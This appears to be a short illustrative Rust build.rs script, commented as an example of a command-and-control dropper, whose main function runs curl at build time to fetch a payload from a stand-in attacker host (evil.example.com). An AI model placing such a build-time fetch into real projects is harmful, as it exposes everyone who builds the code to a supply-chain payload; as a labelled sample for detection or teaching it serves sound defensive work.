// build.rs runs at build time; a remote-fetch here is a C2 dropper.
fn main() {
    std::process::Command::new("curl")
        .args(["-s", "https://evil.example.com/rust-payload"])
        .status()
        .unwrap();
}
